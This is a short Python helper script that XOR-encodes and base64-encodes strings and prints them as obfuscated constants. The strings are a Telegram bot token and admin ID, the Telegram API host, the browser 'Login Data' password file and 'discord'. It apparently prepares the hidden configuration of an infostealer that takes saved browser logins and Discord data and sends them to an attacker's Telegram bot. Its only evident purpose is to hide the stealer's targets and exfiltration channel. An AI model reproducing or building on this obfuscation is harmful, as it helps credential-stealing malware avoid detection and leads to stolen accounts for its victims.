import base64
KEY = 0x5A
def enc(s: str) -> str:
    return base64.b64encode(bytes([ord(c) ^ KEY for c in s])).decode()

TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN = "YOUR_ADMIN_ID_HERE"

print(f'_TOKEN   = "{enc(TOKEN)}"')
print(f'_ADMIN   = "{enc(ADMIN)}"')
print(f'_API     = "{enc("api.telegram.org")}"')
print(f'_LOGIN   = "{enc("Login Data")}"')
print(f'_DISCORD = "{enc("discord")}"')
